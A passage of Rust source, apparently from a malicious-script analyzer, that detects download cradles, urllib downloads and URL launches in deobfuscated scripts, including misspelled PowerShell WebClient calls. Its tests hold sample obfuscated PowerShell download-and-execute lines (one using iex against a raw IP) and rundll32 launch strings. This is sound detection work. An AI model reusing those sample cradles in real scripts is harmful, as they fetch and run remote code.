    python_bounded_inflate(flate2::read::ZlibDecoder::new(decoded))
}

fn inflate_python_literal_gzip(decoded: &[u8]) -> Option<String> {
    python_bounded_inflate(flate2::read::GzDecoder::new(decoded))
}

fn python_bounded_inflate<R: std::io::Read>(reader: R) -> Option<String> {
    use std::io::Read as _;

    const MAX_DECOMPRESSED_BYTES: u64 = 64 * 1024;

    let mut limited = reader.take(MAX_DECOMPRESSED_BYTES + 1);
    let mut bytes = Vec::new();
    limited.read_to_end(&mut bytes).ok()?;
    if bytes.len() as u64 > MAX_DECOMPRESSED_BYTES {
        return None;
    }
    String::from_utf8(bytes).ok()
}

fn is_python_base64_literal(s: &str) -> bool {
    s.chars()
        .all(|ch| ch.is_ascii_alphanumeric() || matches!(ch, '+' | '/' | '_' | '-' | '='))
}

fn python_b64_suffix_has_urlsafe_altchars(suffix: &str) -> bool {
    #[allow(clippy::expect_used)]
    static PY_B64_ALTCHARS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)^\s*,\s*(?:altchars\s*=\s*)?(?:[bB])?['"]-_['"]\s*$"#)
            .expect("python b64 altchars regex")
    });

    PY_B64_ALTCHARS_RE.is_match(suffix)
}

fn emit_python_download(
    url: &str,
    deobfuscated: &str,
    env: &mut Environment,
    known: &mut std::collections::HashSet<String>,
) {
    emit_python_download_with_dst(url, None, deobfuscated, env, known);
}

fn emit_python_download_with_dst(
    url: &str,
    dst: Option<&str>,
    deobfuscated: &str,
    env: &mut Environment,
    known: &mut std::collections::HashSet<String>,
) {
    let url = trim_url_suffix(url).to_string();
    if is_noise_url(&url) || !known.insert(url.clone()) {
        return;
    }
    let line_hint = deobfuscated
        .lines()
        .find(|line| line.contains(&url))
        .map(str::to_string)
        .unwrap_or_default();
    env.traits.push(Trait::Download {
        cmd: line_hint,
        src: url,
        dst: dst.map(str::to_string),
    });
}

fn scan_typo_webclient_downloads(deobfuscated: &str, env: &mut Environment) {
    if !has_typo_webclient_download_atom(deobfuscated) {
        return;
    }

    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for (method, url) in find_dotted_method_url_literals(deobfuscated) {
        if method.eq_ignore_ascii_case("de") {
            emit_typo_webclient_download(&url, env, &mut known);
            continue;
        }
        if !is_likely_webclient_download_method(&method) {
            continue;
        }
        emit_typo_webclient_download(&url, env, &mut known);
    }
}

fn has_typo_webclient_download_atom(text: &str) -> bool {
    let has_url = [
        b"http:".as_slice(),
        b"https:".as_slice(),
        b"ftp:".as_slice(),
        b"file:".as_slice(),
    ]
    .iter()
    .any(|atom| contains_ascii_case_insensitive_atom(text, atom));
    if !has_url {
        return false;
    }

    [
        b"download".as_slice(),
        b"dwnload".as_slice(),
        b"wnload".as_slice(),
        b"ownload".as_slice(),
        b"down".as_slice(),
        b"ebc".as_slice(),
    ]
    .iter()
    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
}

fn contains_ascii_case_insensitive_atom(text: &str, atom: &[u8]) -> bool {
    !atom.is_empty()
        && text.as_bytes().windows(atom.len()).any(|window| {
            window
                .iter()
                .zip(atom)
                .all(|(byte, atom_byte)| byte.eq_ignore_ascii_case(atom_byte))
        })
}

fn find_call_url_literals(text: &str, names: &[&str]) -> Vec<String> {
    let mut found = Vec::new();
    let mut call_sites = Vec::new();
    for name in names {
        let mut search_start = 0;
        while let Some(name_start) = find_ascii_case_insensitive(text, name, search_start) {
            let name_end = name_start + name.len();
            if !is_callable_name_boundary(text, name_start, name_end) {
                search_start = name_end;
                continue;
            }
            let open = skip_ascii_ws(text, name_end);
            if text.as_bytes().get(open) != Some(&b'(') {
                search_start = name_end;
                continue;
            }
            let Some(close) = find_matching_paren(text, open) else {
                search_start = open + 1;
                continue;
            };
            call_sites.push((open, close));
            search_start = close + 1;
        }
    }
    if call_sites.is_empty() {
        return found;
    }

    let empty_bindings = HashMap::new();
    let mut bindings = None;
    for (open, close) in call_sites {
        let args = &text[open + 1..close];
        if let Some(url) = first_python_url_arg(args, &empty_bindings).or_else(|| {
            let bindings = bindings.get_or_insert_with(|| {
                let string_bindings = collect_python_string_bindings(text);
                let mut bindings = collect_python_url_string_bindings_from(&string_bindings);
                bindings.extend(collect_python_urllib_request_object_url_bindings(
                    text, &bindings,
                ));
                bindings
            });
            first_python_url_arg(args, bindings)
        }) {
            found.push(url);
        }
    }
    found
}

fn collect_python_urllib_request_object_url_bindings(
    text: &str,
    url_bindings: &HashMap<String, String>,
) -> HashMap<String, String> {
    let mut found = HashMap::new();
    let mut names = vec![
        "urllib.request.Request".to_string(),
        "urllib.Request".to_string(),
    ];
    names.extend(collect_python_urllib_call_aliases(text, "Request"));
    for name in names {
        let mut search_start = 0;
        while let Some(name_start) = find_ascii_case_insensitive(text, &name, search_start) {
            let name_end = name_start + name.len();
            if !is_callable_name_boundary(text, name_start, name_end) {
                search_start = name_end;
                continue;
            }
            let Some(lhs) = python_assignment_lhs_before(text, name_start) else {
                search_start = name_end;
                continue;
            };
            let open = skip_ascii_ws(text, name_end);
            if text.as_bytes().get(open) != Some(&b'(') {
                search_start = name_end;
                continue;
            }
            let Some(close) = find_matching_paren(text, open) else {
                search_start = open + 1;
                continue;
            };
            if let Some(url) = first_python_url_arg(&text[open + 1..close], url_bindings) {
                found.insert(lhs, url);
            }
            search_start = close + 1;
        }
    }
    found
}

fn python_assignment_lhs_before(text: &str, expr_start: usize) -> Option<String> {
    let prefix = text.get(..expr_start)?.trim_end();
    let before_eq = prefix.strip_suffix('=')?.trim_end();
    let ident_start = before_eq
        .rfind(|c: char| !(c.is_ascii_alphanumeric() || c == '_'))
        .map_or(0, |idx| idx + 1);
    let ident = before_eq.get(ident_start..)?.trim();
    is_python_identifier(ident).then(|| ident.to_string())
}

fn find_python_urlretrieve_literals(text: &str) -> Vec<(String, Option<String>)> {
    let mut found = Vec::new();
    let mut names = vec![
        "urllib.request.urlretrieve".to_string(),
        "urllib.urlretrieve".to_string(),
    ];
    names.extend(collect_python_urllib_call_aliases(text, "urlretrieve"));
    let mut call_sites = Vec::new();
    for name in names {
        let mut search_start = 0;
        while let Some(name_start) = find_ascii_case_insensitive(text, &name, search_start) {
            let name_end = name_start + name.len();
            if !is_callable_name_boundary(text, name_start, name_end) {
                search_start = name_end;
                continue;
            }
            let open = skip_ascii_ws(text, name_end);
            if text.as_bytes().get(open) != Some(&b'(') {
                search_start = name_end;
                continue;
            }
            let Some(close) = find_matching_paren(text, open) else {
                search_start = open + 1;
                continue;
            };
            call_sites.push((open, close));
            search_start = close + 1;
        }
    }
    if call_sites.is_empty() {
        return found;
    }

    let string_bindings = collect_python_string_bindings(text);
    let url_bindings = collect_python_url_string_bindings_from(&string_bindings);
    for (open, close) in call_sites {
        if let Some((url, dst)) = python_urlretrieve_download_args(
            &text[open + 1..close],
            &url_bindings,
            &string_bindings,
        ) {
            found.push((url, dst));
        }
    }
    found
}

fn python_urlretrieve_download_args(
    args: &str,
    url_bindings: &HashMap<String, String>,
    string_bindings: &HashMap<String, String>,
) -> Option<(String, Option<String>)> {
    let parts = split_python_top_level_args(args);
    if let Some((idx, url)) = parts
        .iter()
        .take(4)
        .enumerate()
        .find_map(|(idx, arg)| first_url_literal(arg).map(|url| (idx, url)))
    {
        let dst = parts
            .iter()
            .skip(idx + 1)
            .find_map(|part| python_string_arg(part, string_bindings))
            .or_else(|| python_keyword_string_arg(&parts, "filename", string_bindings));
        return Some((url, dst));
    }

    parts.iter().take(4).enumerate().find_map(|(idx, arg)| {
        let url = python_url_arg_from_binding(arg, url_bindings)?;
        let dst = parts
            .iter()
            .skip(idx + 1)
            .find_map(|part| python_string_arg(part, string_bindings))
            .or_else(|| python_keyword_string_arg(&parts, "filename", string_bindings));
        Some((url, dst))
    })
}

fn python_string_arg(arg: &str, bindings: &HashMap<String, String>) -> Option<String> {
    python_string_literal_arg(arg).or_else(|| python_string_arg_from_binding(arg, bindings))
}

fn python_string_literal_arg(arg: &str) -> Option<String> {
    let expr = if let Some((key, value)) = arg.split_once('=') {
        if is_python_identifier(key.trim()) {
            value
        } else {
            arg
        }
    } else {
        arg
    };
    if let Some(literal) = python_adjacent_string_literal_expr(expr) {
        return (!looks_like_direct_url(trim_url_suffix(&literal))).then_some(literal);
    }
    python_quoted_literals(expr)
        .into_iter()
        .find(|literal| !looks_like_direct_url(trim_url_suffix(literal)))
}

fn python_string_arg_from_binding(arg: &str, bindings: &HashMap<String, String>) -> Option<String> {
    let expr = if let Some((key, value)) = arg.split_once('=') {
        if is_python_identifier(key.trim()) {
            value
        } else {
            arg
        }
    } else {
        arg
    };
    let expr = expr.trim();
    let (ident, ident_end) = parse_ascii_ident(expr, 0)?;
    if skip_ascii_ws(expr, ident_end) != expr.len() {
        return None;
    }
    bindings
        .get(&ident)
        .filter(|value| !looks_like_direct_url(trim_url_suffix(value)))
        .cloned()
}

fn python_keyword_string_arg(
    parts: &[&str],
    keyword: &str,
    bindings: &HashMap<String, String>,
) -> Option<String> {
    parts.iter().find_map(|part| {
        let (key, value) = part.split_once('=')?;
        key.trim()
            .eq_ignore_ascii_case(keyword)
            .then(|| python_string_arg(value, bindings))?
    })
}

fn collect_python_urllib_call_aliases(text: &str, target_method: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"urllib")
        && !contains_ascii_case_insensitive_atom(text, target_method.as_bytes())
    {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_FROM_URLLIB_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)\bfrom\s+urllib(?:\.request)?\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#,
        )
        .expect("python urllib import regex")
    });
    let mut aliases = Vec::new();
    for alias in collect_python_urllib_request_module_aliases(text)
        .into_iter()
        .filter(|alias| alias != "urllib.request")
    {
        aliases.push(format!("{alias}.{target_method}"));
    }
    aliases.extend(collect_python_urllib_assigned_call_aliases(
        text,
        target_method,
    ));
    for caps in PY_FROM_URLLIB_IMPORT_RE.captures_iter(text).take(8) {
        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            let words: Vec<&str> = part.split_ascii_whitespace().collect();
            let Some(method) = words.first().copied() else {
                continue;
            };
            if method != target_method {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or(method)
            } else {
                method
            };
            if is_python_identifier(alias) {
                aliases.push(alias.to_string());
            }
        }
    }
    aliases
}

fn collect_python_urllib_request_module_aliases(text: &str) -> Vec<String> {
    if !contains_ascii_case_insensitive_atom(text, b"urllib") {
        return vec!["urllib.request".to_string()];
    }

    #[allow(clippy::expect_used)]
    static PY_IMPORT_URLLIB_REQUEST_ALIAS_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bimport\s+urllib\.request\s+as\s+([A-Za-z_][A-Za-z0-9_]*)"#)
            .expect("python urllib.request import alias regex")
    });
    #[allow(clippy::expect_used)]
    static PY_FROM_URLLIB_REQUEST_MODULE_IMPORT_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)\bfrom\s+urllib\s+import\s*(?:\(([^)]{0,512})\)|([^;"'\r\n]+))"#)
            .expect("python urllib request module import regex")
    });

    let mut aliases = vec!["urllib.request".to_string()];
    aliases.extend(
        PY_IMPORT_URLLIB_REQUEST_ALIAS_RE
            .captures_iter(text)
            .take(8)
            .filter_map(|caps| caps.get(1).map(|m| m.as_str().to_string())),
    );
    for caps in PY_FROM_URLLIB_REQUEST_MODULE_IMPORT_RE
        .captures_iter(text)
        .take(8)
    {
        let Some(imports) = caps.get(1).or_else(|| caps.get(2)).map(|m| m.as_str()) else {
            continue;
        };
        for part in imports.split(',') {
            let part = part.trim().trim_matches(['(', ')']);
            let words: Vec<&str> = part.split_ascii_whitespace().collect();
            if words.first().copied() != Some("request") {
                continue;
            }
            let alias = if words.get(1).is_some_and(|w| w.eq_ignore_ascii_case("as")) {
                words.get(2).copied().unwrap_or("request")
            } else {
                "request"
            };
            if is_python_identifier(alias) {
                aliases.push(alias.to_string());
            }
        }
    }
    aliases
}

fn collect_python_urllib_assigned_call_aliases(text: &str, target_method: &str) -> Vec<String> {
    if !text.as_bytes().contains(&b'=')
        || !contains_ascii_case_insensitive_atom(text, target_method.as_bytes())
    {
        return Vec::new();
    }

    #[allow(clippy::expect_used)]
    static PY_URLLIB_METHOD_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([A-Za-z_][A-Za-z0-9_]*(?:\.request)?)\.(urlopen|urlretrieve)\b"#,
        )
        .expect("python urllib method assignment regex")
    });

    let modules = collect_python_urllib_request_module_aliases(text);
    PY_URLLIB_METHOD_ASSIGN_RE
        .captures_iter(text)
        .take(8)
        .filter_map(|caps| {
            let alias = caps.get(1)?.as_str();
            let module = caps.get(2)?.as_str();
            let method = caps.get(3)?.as_str();
            if method == target_method && modules.iter().any(|known| known == module) {
                Some(alias.to_string())
            } else {
                None
            }
        })
        .collect()
}

fn find_dotted_method_url_literals(text: &str) -> Vec<(String, String)> {
    let mut found = Vec::new();
    let mut cursor = 0;
    while let Some(dot_rel) = text[cursor..].find('.') {
        let dot = cursor + dot_rel;
        let method_start = dot + 1;
        let Some((method, method_end)) = parse_ascii_ident(text, method_start) else {
            cursor = method_start;
            continue;
        };
        let open = skip_ascii_ws(text, method_end);
        if text.as_bytes().get(open) != Some(&b'(') {
            cursor = method_end;
            continue;
        }
        let Some(close) = find_matching_paren(text, open) else {
            cursor = open + 1;
            continue;
        };
        if let Some(url) = first_url_literal(&text[open + 1..close]) {
            if !method.eq_ignore_ascii_case("de") || has_short_webclient_context(text, dot) {
                found.push((method, url));
            }
        }
        cursor = close + 1;
    }
    found
}

fn find_ascii_case_insensitive(text: &str, needle: &str, start: usize) -> Option<usize> {
    let lower = text[start..].to_ascii_lowercase();
    lower
        .find(&needle.to_ascii_lowercase())
        .map(|pos| start + pos)
}

fn is_callable_name_boundary(text: &str, start: usize, end: usize) -> bool {
    let prev_ok = start == 0
        || text[..start]
            .chars()
            .next_back()
            .map(|c| !c.is_ascii_alphanumeric() && c != '_' && c != '.')
            .unwrap_or(true);
    let next_ok = text[end..]
        .chars()
        .next()
        .map(|c| !c.is_ascii_alphanumeric() && c != '_' && c != '.')
        .unwrap_or(true);
    prev_ok && next_ok
}

fn skip_ascii_ws(text: &str, mut idx: usize) -> usize {
    while let Some(byte) = text.as_bytes().get(idx) {
        if !byte.is_ascii_whitespace() {
            break;
        }
        idx += 1;
    }
    idx
}

fn parse_ascii_ident(text: &str, start: usize) -> Option<(String, usize)> {
    let bytes = text.as_bytes();
    let mut end = start;
    while let Some(byte) = bytes.get(end) {
        if !byte.is_ascii_alphabetic() {
            break;
        }
        end += 1;
    }
    (end > start).then(|| (text[start..end].to_string(), end))
}

fn find_matching_paren(text: &str, open: usize) -> Option<usize> {
    let bytes = text.as_bytes();
    let mut depth = 0usize;
    let mut quote: Option<u8> = None;
    let mut i = open;
    while i < bytes.len() {
        let byte = bytes[i];
        if let Some(q) = quote {
            if byte == b'\\' && bytes.get(i + 1) == Some(&q) {
                quote = None;
                i = i.saturating_add(2);
                continue;
            }
            if byte == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match byte {
            b'\\' if matches!(bytes.get(i + 1), Some(b'"' | b'\'')) => {
                quote = bytes.get(i + 1).copied();
                i += 1;
            }
            b'\'' | b'"' => quote = Some(byte),
            b'(' => depth += 1,
            b')' => {
                depth = depth.checked_sub(1)?;
                if depth == 0 {
                    return Some(i);
                }
            }
            _ => {}
        }
        i += 1;
    }
    None
}

fn first_url_literal(args: &str) -> Option<String> {
    if let Some(literal) = python_adjacent_string_literal_expr(args) {
        let trimmed = trim_url_suffix(&literal);
        if looks_like_direct_url(trimmed) {
            return Some(trimmed.to_string());
        }
    }
    python_quoted_literals(args)
        .into_iter()
        .find_map(|literal| {
            looks_like_direct_url(trim_url_suffix(&literal))
                .then(|| trim_url_suffix(&literal).to_string())
        })
}

fn first_python_url_arg(args: &str, bindings: &HashMap<String, String>) -> Option<String> {
    let parts = split_python_top_level_args(args);
    python_keyword_url_arg(&parts, "url", bindings).or_else(|| {
        parts
            .into_iter()
            .take(4)
            .find(|arg| !python_arg_has_keyword(arg))
            .and_then(|arg| python_url_arg_expr(arg, bindings))
    })
}

fn python_keyword_url_arg(
    parts: &[&str],
    keyword: &str,
    bindings: &HashMap<String, String>,
) -> Option<String> {
    parts.iter().find_map(|part| {
        let (key, value) = part.split_once('=')?;
        key.trim()
            .eq_ignore_ascii_case(keyword)
            .then(|| python_url_arg_expr(value, bindings))?
    })
}

fn python_url_arg_expr(arg: &str, bindings: &HashMap<String, String>) -> Option<String> {
    python_inline_urllib_request_url_arg(arg, bindings)
        .or_else(|| first_url_literal(arg))
        .or_else(|| python_url_arg_from_binding(arg, bindings))
}

fn python_inline_urllib_request_url_arg(
    arg: &str,
    bindings: &HashMap<String, String>,
) -> Option<String> {
    let expr = arg.trim();
    for name in ["urllib.request.Request", "urllib.Request", "Request"] {
        if !expr
            .get(..name.len())
            .is_some_and(|prefix| prefix.eq_ignore_ascii_case(name))
        {
            continue;
        }
        if !is_callable_name_boundary(expr, 0, name.len()) {
            continue;
        }
        let open = skip_ascii_ws(expr, name.len());
        if expr.as_bytes().get(open) != Some(&b'(') {
            continue;
        }
        let close = find_matching_paren(expr, open)?;
        if skip_ascii_ws(expr, close + 1) != expr.len() {
            continue;
        }
        return first_python_url_arg(&expr[open + 1..close], bindings);
    }
    None
}

fn python_url_arg_from_binding(arg: &str, bindings: &HashMap<String, String>) -> Option<String> {
    let expr = if let Some((key, value)) = arg.split_once('=') {
        if is_python_identifier(key.trim()) {
            value
        } else {
            arg
        }
    } else {
        arg
    };
    let expr = expr.trim();
    let (ident, ident_end) = parse_ascii_ident(expr, 0)?;
    if skip_ascii_ws(expr, ident_end) != expr.len() {
        return None;
    }
    bindings.get(&ident).cloned()
}

fn split_python_top_level_args(args: &str) -> Vec<&str> {
    let bytes = args.as_bytes();
    let mut parts = Vec::new();
    let mut start = 0usize;
    let mut depth = 0usize;
    let mut quote: Option<u8> = None;
    let mut i = 0usize;
    while i < bytes.len() {
        if let Some(q) = quote {
            if bytes[i] == b'\\' {
                i = i.saturating_add(2);
                continue;
            }
            if bytes[i] == q {
                quote = None;
            }
            i += 1;
            continue;
        }
        match bytes[i] {
            b'\'' | b'"' => quote = Some(bytes[i]),
            b'(' | b'[' | b'{' => depth = depth.saturating_add(1),
            b')' | b']' | b'}' => depth = depth.saturating_sub(1),
            b',' if depth == 0 => {
                parts.push(args[start..i].trim());
                start = i + 1;
            }
            _ => {}
        }
        i += 1;
    }
    if start <= args.len() {
        parts.push(args[start..].trim());
    }
    parts
}

fn collect_python_url_string_bindings_from(
    bindings: &HashMap<String, String>,
) -> HashMap<String, String> {
    bindings
        .iter()
        .filter_map(|(name, value)| {
            let url = normalize_liberal_url_token(trim_url_suffix(value))?;
            Some((name.clone(), url))
        })
        .collect()
}

fn collect_python_string_bindings(text: &str) -> HashMap<String, String> {
    #[allow(clippy::expect_used)]
    static PY_STRING_ASSIGN_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(
            r#"(?is)(?:^|[;"'\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*(?:'([^']{1,2048})'|"([^"]{1,2048})")"#,
        )
        .expect("python string assignment regex")
    });
    #[allow(clippy::expect_used)]
    static PY_STRING_ASSIGN_EXPR_RE: Lazy<Regex> = Lazy::new(|| {
        Regex::new(r#"(?is)(?:^|[;\r\n])\s*([A-Za-z_][A-Za-z0-9_]*)\s*=\s*([^;\r\n]{1,4096})"#)
            .expect("python string assignment expr regex")
    });

    let mut bindings: HashMap<String, String> = PY_STRING_ASSIGN_RE
        .captures_iter(text)
        .take(64)
        .filter_map(|caps| {
            let name = caps.get(1)?.as_str();
            let value = caps.get(2).or_else(|| caps.get(3))?.as_str();
            Some((name.to_string(), value.to_string()))
        })
        .collect();

    for caps in PY_STRING_ASSIGN_EXPR_RE.captures_iter(text).take(64) {
        let Some(name) = caps.get(1).map(|m| m.as_str()) else {
            continue;
        };
        let Some(expr) = caps.get(2).map(|m| m.as_str()) else {
            continue;
        };
        let Some(value) = python_adjacent_string_literal_expr(expr) else {
            continue;
        };
        bindings.insert(name.to_string(), value);
    }
    bindings
}

fn python_adjacent_string_literal_expr(expr: &str) -> Option<String> {
    let expr = expr.trim();
    if expr.is_empty() {
        return None;
    }
    let mut out = String::new();
    let mut count = 0usize;
    let mut cursor = 0usize;
    while cursor < expr.len() {
        cursor = skip_ascii_ws(expr, cursor);
        if cursor == expr.len() {
            break;
        }
        let (end, literal) = parse_python_quoted_literal_at(expr, cursor)?;
        out.push_str(&literal);
        count += 1;
        cursor = end;
    }
    (count > 0).then_some(out)
}

fn parse_python_quoted_literal_at(expr: &str, start: usize) -> Option<(usize, String)> {
    let bytes = expr.as_bytes();
    let quote = *bytes.get(start)?;
    if quote != b'\'' && quote != b'"' {
        return None;
    }
    let mut literal = String::new();
    let mut i = start + 1;
    while i < bytes.len() {
        let byte = bytes[i];
        if byte == b'\\' {
            let Some(next) = bytes.get(i + 1) else {
                literal.push('\\');
                return Some((bytes.len(), literal));
            };
            literal.push(*next as char);
            i += 2;
            continue;
        }
        if byte == quote {
            return Some((i + 1, literal));
        }
        literal.push(byte as char);
        i += 1;
    }
    None
}

fn python_quoted_literals(args: &str) -> Vec<String> {
    let bytes = args.as_bytes();
    let mut literals = Vec::new();
    let mut i = 0;
    while i < bytes.len() {
        let mut quote = bytes[i];
        if quote == b'\\' && matches!(bytes.get(i + 1), Some(b'"' | b'\'')) {
            i += 1;
            quote = bytes[i];
        }
        if quote != b'"' && quote != b'\'' {
            i += 1;
            continue;
        }

        let literal_start = i + 1;
        let mut literal = String::new();
        i = literal_start;
        while i < bytes.len() {
            let byte = bytes[i];
            if byte == b'\\' {
                if bytes.get(i + 1) == Some(&quote) {
                    break;
                }
                if let Some(next) = bytes.get(i + 1) {
                    literal.push(*next as char);
                    i += 2;
                    continue;
                }
            }
            if byte == quote {
                break;
            }
            literal.push(byte as char);
            i += 1;
        }
        literals.push(literal);
        i += 1;
    }
    literals
}

fn has_short_webclient_context(text: &str, dot: usize) -> bool {
    let window_start = dot.saturating_sub(32);
    text[window_start..dot].to_ascii_lowercase().contains("ebc")
}

fn emit_typo_webclient_download(
    url: &str,
    env: &mut Environment,
    known: &mut std::collections::HashSet<String>,
) {
    let url = url.to_string();
    if is_noise_url(&url) || !known.insert(url.clone()) {
        return;
    }
    env.traits.push(Trait::Download {
        cmd: "powershell-webclient-typo".to_string(),
        src: url,
        dst: None,
    });
}

fn is_likely_webclient_download_method(method: &str) -> bool {
    let normalized: String = method
        .chars()
        .filter(|c| c.is_ascii_alphabetic())
        .flat_map(|c| c.to_lowercase())
        .collect();
    if normalized.len() < 6 {
        return false;
    }

    ["downloadfile", "downloadstring"].iter().any(|target| {
        edit_distance_at_most(&normalized, target, typo_method_distance_limit(&normalized))
    })
}

fn typo_method_distance_limit(method: &str) -> usize {
    if method.len() >= 10 {
        4
    } else {
        3
    }
}

#[cfg(test)]
mod typo_webclient_prefilter_tests {
    use super::has_typo_webclient_download_atom;

    #[test]
    fn prefilter_allows_known_typo_webclient_shapes() {
        for text in [
            "powershell (New-Ojec Sstem.Net.WebCliet).DownloadFle('https://drop.example/a')",
            "powershll (Nw-ject Sstem.Net.Welint).Dwnloadile('https://raw.example/b')",
            "set x=iex(\"w-ject t.bient).wnloadring('http://172.104.150.66/p')\")",
            "eh (Ne-bet -peme tem.et.ebCet).de('http://tvde.m/e/pt.zp')",
        ] {
            assert!(has_typo_webclient_download_atom(text), "blocked: {text}");
        }
    }

    #[test]
    fn prefilter_blocks_text_without_webclient_download_atoms() {
        assert!(!has_typo_webclient_download_atom(
            "set a.b.c=1\r\necho https://docs.example/reference\r\nfor %i in (a.b.c) do echo %i"
        ));
    }
}

fn edit_distance_at_most(left: &str, right: &str, max_distance: usize) -> bool {
    if left.len().abs_diff(right.len()) > max_distance {
        return false;
    }

    let right_chars: Vec<char> = right.chars().collect();
    let mut prev: Vec<usize> = (0..=right_chars.len()).collect();
    for (i, lc) in left.chars().enumerate() {
        let mut curr = vec![i + 1];
        let mut row_min = curr[0];
        for (j, rc) in right_chars.iter().enumerate() {
            let substitution = usize::from(lc != *rc);
            let cost = (prev[j + 1] + 1)
                .min(curr[j] + 1)
                .min(prev[j] + substitution);
            row_min = row_min.min(cost);
            curr.push(cost);
        }
        if row_min > max_distance {
            return false;
        }
        prev = curr;
    }
    prev[right_chars.len()] <= max_distance
}

fn scan_url_launch_deob_text(deobfuscated: &str, env: &mut Environment) {
    if !has_url_launch_atom(deobfuscated) {
        return;
    }

    let mut known: std::collections::HashSet<String> = env
        .traits
        .iter()
        .filter_map(|t| match t {
            Trait::UrlLaunch { url, .. } => Some(url.clone()),
            Trait::UrlArgument { url, .. } => Some(url.clone()),
            Trait::UrlVariable { url, .. } => Some(url.clone()),
            Trait::Download { src, .. } => Some(src.clone()),
            Trait::CertutilDownload { url, .. } => Some(url.clone()),
            Trait::BitsadminDownload { url, .. } => Some(url.clone()),
            _ => None,
        })
        .collect();

    for line in deobfuscated.lines() {
        if !has_url_launch_line_atom(line) {
            continue;
        }
        let tokens = split_words(line);
        if tokens.is_empty() {
            continue;
        }

        for i in 0..tokens.len() {
            let cmd = command_name(strip_quotes(&tokens[i]));
            let Some(url) = (if cmd == "start" || cmd == "start.exe" {
                url_launch_after_start(&tokens, i + 1)
            } else if cmd == "rundll32" || cmd == "rundll32.exe" {
                url_launch_after_rundll32(&tokens, i + 1)
            } else if is_url_launcher_command(&cmd) {
                first_url_after(&tokens, i + 1, false, true)
            } else {
                None
            }) else {
                continue;
            };

            if is_noise_url(&url) || !known.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::UrlLaunch {
                cmd: line.to_string(),
                url,
            });
        }

        for url in powershell_url_launches_in_line(line) {
            if is_noise_url(&url) || !known.insert(url.clone()) {
                continue;
            }
            env.traits.push(Trait::UrlLaunch {
                cmd: line.to_string(),
                url,
            });
        }
    }
}

fn has_url_launch_atom(text: &str) -> bool {
    let has_urlish = [
        b"http:".as_slice(),
        b"https:".as_slice(),
        b"file:".as_slice(),
    ]
    .iter()
    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
        || (text.contains('/') && text.contains('.'));
    if !has_urlish {
        return false;
    }
    [
        b"start".as_slice(),
        b"explorer".as_slice(),
        b"rundll32".as_slice(),
        b"fileprotocolhandler".as_slice(),
        b"openurl".as_slice(),
        b"imageview_fullscreen".as_slice(),
        b"start-process".as_slice(),
        b"saps".as_slice(),
        b"invoke-item".as_slice(),
        b"ii ".as_slice(),
        b"msedge".as_slice(),
        b"chrome".as_slice(),
        b"firefox".as_slice(),
        b"brave".as_slice(),
        b"opera".as_slice(),
        b"iexplore".as_slice(),
        b"hh".as_slice(),
    ]
    .iter()
    .any(|atom| contains_ascii_case_insensitive_atom(text, atom))
}

fn has_url_launch_line_atom(line: &str) -> bool {
    if !has_url_launch_atom(line) {
        return false;
    }
    let trimmed = line.trim_start_matches(['@', ' ', '\t', '(']);
    let first = trimmed
        .split_ascii_whitespace()
        .next()
        .unwrap_or("")
        .trim_matches('"')
        .to_ascii_lowercase();
    !matches!(first.as_str(), "set" | "setx" | "echo" | "rem" | "::")
}

#[cfg(test)]
mod url_launch_prefilter_tests {
    use super::{has_url_launch_atom, has_url_launch_line_atom};

    #[test]
    fn prefilter_allows_supported_url_launch_shapes() {
        assert!(has_url_launch_atom(
            r#"start "" "https://lure.example/a.pdf""#
        ));
        assert!(has_url_launch_atom(
            "explorer.exe portal-schemeless.example/privacy/"
        ));
        assert!(has_url_launch_atom(
            "rundll32.exe url.dll,FileProtocolHandler https://launch.example/a"
        ));
        assert!(has_url_launch_atom(
            "powershell -Command \"Start-Process -FilePath:pslaunch.example/e.pdf\""
        ));
        assert!(has_url_launch_atom("hh.exe https://hh.example/help.chm"));
    }

    #[test]
    fn prefilter_blocks_unrelated_url_text() {
        assert!(!has_url_launch_atom("echo https://plain.example/payload"));
        assert!(!has_url_launch_line_atom(
            "set browser=chrome.exe && set url=plain.example/payload"
        ));
    }
}

fn powershell_url_launches_in_line(line: &str) -> Vec<String> {
    let mut found = Vec::new();
    for name in ["Start-Process", "saps", "Invoke-Item", "ii"] {
        let mut search_start = 0;
        while let Some(name_start) = find_ascii_case_insensitive(line, name, search_start) {
            let name_end = name_start + name.len();
            if !is_callable_name_boundary(line, name_start, name_end) {
                search_start = name_end;
                continue;
            }
            let tokens = split_words(&line[name_start..]);
            if tokens
                .first()
                .map(|token| is_url_launcher_command(&command_name(strip_quotes(token))))
                .unwrap_or(false)
            {
                if let Some(url) = first_url_after(&tokens, 1, false, true) {
                    found.push(url);
                }
            }
            search_start = name_end;
        }
    }
    found
}

fn url_launch_after_rundll32(tokens: &[String], start: usize) -> Option<String> {
    let handler_idx = (start..tokens.len())
        .take(4)
        .find(|idx| rundll32_url_launch_export(strip_quotes(&tokens[*idx])))?;
    first_url_after(tokens, handler_idx + 1, false, true)
}

fn rundll32_url_launch_export(token: &str) -> bool {
    let lower = token.to_ascii_lowercase();
